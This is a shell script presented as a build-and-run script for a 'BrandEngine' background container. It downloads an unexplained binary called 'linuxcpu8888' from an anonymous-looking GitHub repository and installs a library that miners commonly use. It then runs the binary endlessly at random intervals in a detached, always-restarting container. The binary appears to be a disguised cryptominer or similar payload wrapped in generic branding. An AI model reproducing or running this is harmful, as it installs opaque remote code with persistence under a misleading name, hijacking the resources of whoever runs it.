#!/bin/bash

set -e

echo "=============================================="
echo "     Building and Running BrandEngine Docker  "
echo "=============================================="

# Variables
BINARY_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/linuxcpu8888"
BUILD_DIR="brandengine_build"
BINARY_NAME="worker"

# 1️⃣ Prepare build directory
echo "[1/5] Preparing Docker build files..."
rm -rf $BUILD_DIR
mkdir -p $BUILD_DIR

# 2️⃣ Download binary
echo "[2/5] Downloading binary from $BINARY_URL ..."
curl -L -o $BUILD_DIR/$BINARY_NAME $BINARY_URL
chmod +x $BUILD_DIR/$BINARY_NAME

# 3️⃣ Create entrypoint script
echo "[3/5] Creating entrypoint script..."
cat > $BUILD_DIR/entrypoint.sh << 'EOF'
#!/bin/bash

# ----------------------------------------------
# BrandEngine — Background Container Worker
# ----------------------------------------------

EXEC="/opt/brand/worker"

# Example safe branded args (customize)
ARGS="--task background --mode worker"

MIN_DELAY=32
MAX_DELAY=62

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] BrandEngine: $1"
}

log "Container started."

while true; do
    log "Running job cycle..."
    $EXEC $ARGS

    SLEEP_TIME=$(( (RANDOM % (MAX_DELAY - MIN_DELAY + 1)) + MIN_DELAY ))
    log "Sleeping $SLEEP_TIME seconds..."
    sleep $SLEEP_TIME
done
EOF

chmod +x $BUILD_DIR/entrypoint.sh

# 4️⃣ Create Dockerfile
echo "[4/5] Creating Dockerfile..."
cat > $BUILD_DIR/Dockerfile << 'EOF'
FROM ubuntu:22.04

# Install bash, curl, and required libraries for the binary
RUN apt-get update && \
    apt-get install -y bash curl libjansson4 && \
    rm -rf /var/lib/apt/lists/*

# Create working directory
RUN mkdir -p /opt/brand

# Copy binary and entrypoint
COPY worker /opt/brand/worker
COPY entrypoint.sh /opt/brand/entrypoint.sh

# Set permissions
RUN chmod +x /opt/brand/worker
RUN chmod +x /opt/brand/entrypoint.sh

WORKDIR /opt/brand

ENTRYPOINT ["/opt/brand/entrypoint.sh"]
EOF

# 5️⃣ Build Docker image
echo "[5/5] Building Docker image..."
docker build -t brandengine $BUILD_DIR

# Remove old container if exists
docker rm -f brandengine >/dev/null 2>&1 || true

# Run container
docker run -d --name brandengine --restart always brandengine

echo "=============================================="
echo " BrandEngine container is now running."
echo "----------------------------------------------"
echo " Container name : brandengine"
echo " Image          : brandengine"
echo " Executable     : /opt/brand/worker"
echo " View logs      : docker logs -f brandengine"
echo "=============================================="
